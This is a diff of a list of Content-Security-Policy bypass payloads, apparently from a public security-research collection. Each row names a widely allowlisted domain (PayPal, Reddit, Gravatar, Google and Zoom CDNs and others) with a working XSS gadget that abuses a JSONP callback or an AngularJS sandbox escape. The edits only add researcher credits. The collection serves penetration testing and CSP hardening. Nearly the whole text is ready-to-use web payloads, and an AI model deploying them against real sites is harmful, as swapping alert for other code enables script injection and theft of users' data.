@@ -53,9 +53,9 @@ s.ytimg.com	<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angul
 search.yahoo.com	<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>	
 secure.gravatar.com	<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>	
 shop.samsung.com	<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>	renniepak
-soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>	
+soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>	renniepak
 ssl.gstatic.com	<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
-st3.zoom.us	<body ng-app ng-csp><script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	
+st3.zoom.us	<body ng-app ng-csp><script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	renniepak
 storage.googleapis.com	<script src="https://storage.googleapis.com/bypass_csp/xss.js"></script>	kevin_mizu
 suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>	
 tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>	YoeriVegt
@@ -83,7 +83,7 @@ www.googletagmanager.com	<script src="https://www.googletagmanager.com/debug/api
 www.gstatic.com	<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	IvarsVids
 www.meteoprog.ua	<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>	
 www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>	
-www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>	
+www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>	renniepak
 www.recaptcha.net	<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>	
 www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>	renniepak
 www.roblox.com	<script src="https://www.roblox.com/item-thumbnails?params=[{assetId:1}]&jsoncallback=alert"></script>	renniepak
